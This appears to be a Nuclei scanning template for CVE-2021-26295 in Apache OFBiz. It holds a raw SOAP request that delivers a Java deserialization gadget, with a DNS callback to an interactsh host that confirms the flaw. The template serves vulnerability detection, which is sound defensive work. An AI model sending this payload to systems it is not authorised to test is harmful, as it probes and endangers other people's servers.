folder-9/yaml-poc-apache-ofbiz-logical-CVE-2021-26295.yaml

id: CVE-2021-26295
info:
  name: Apache OFBiz SOAP Java Deserialization
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Apache OFBiz SOAP endpoint allows Java deserialization, which can lead to remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-26295
    - https://packetstormsecurity.com/files/162104/Apache-OFBiz-SOAP-Java-Deserialization.html
    - https://seclists.org/oss-sec/2021/q1/255

variables:
  reverseDomain: "{{interactsh-url}}"
  payload: "{{generate_java_gadget('dns', reverseDomain, 'url')}}"

http:
  - raw:
      - |
        POST /webtools/control/SOAPService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version='1.0' encoding='UTF-8'?>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header/>
          <soapenv:Body>
            <ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">
              <ns1:cus-obj>{{payload}}</ns1:cus-obj>
            </ns1:clearAllEntityCaches>
          </soapenv:Body>
        </soapenv:Envelope>
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: word
        part: interactsh_request
        words:
          - "{{reverseDomain}}"
